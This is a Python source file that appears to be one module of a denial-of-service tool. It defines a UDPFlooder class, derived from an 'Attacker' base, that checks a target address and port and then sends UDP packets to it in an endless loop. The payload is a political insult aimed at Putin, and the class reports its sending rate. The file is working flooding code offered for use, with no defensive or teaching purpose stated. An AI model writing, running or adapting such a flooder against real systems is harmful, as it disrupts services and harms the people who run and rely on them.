from datetime import datetime
import socket
from os import urandom as randbytes
from .main import Attacker
from .validators import AddressWithPortValidator
from .connection_checkers import UDPChecker
from .utils import Address


class UDPFlooder(Attacker):
    def __init__(self, address):
        self.address = Address(address)
        self._requsets_sent = 0
        self._time_flood_started = None

    def validate(self):
        AddressWithPortValidator(self.address.raw).validate()

    def run(self):
        self.validate()
        self._start_flood()

    def _start_flood(self):
        address = self.address.get_address()
        port = int(self.address.get_port())
        self._time_flood_started = datetime.now()
        with self.get_socket() as soc:
            while True:
                soc.sendto(b'putin Huilo', (address, port))
                self._requsets_sent += 1

    def print_rate(self):
        if not self._time_flood_started:
            print('Flood not started.')
            return
        current_time = datetime.now()
        time_delta = current_time - self._time_flood_started
        seconds_diff = time_delta.seconds
        if not seconds_diff:
            print(self._rate_msg(0))
            return
        print(self._rate_msg(self._requsets_sent / seconds_diff))

    @staticmethod
    def _rate_msg(rate):
        return f'Requests rate is {rate} requests per second'

    @staticmethod
    def get_socket():
        return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
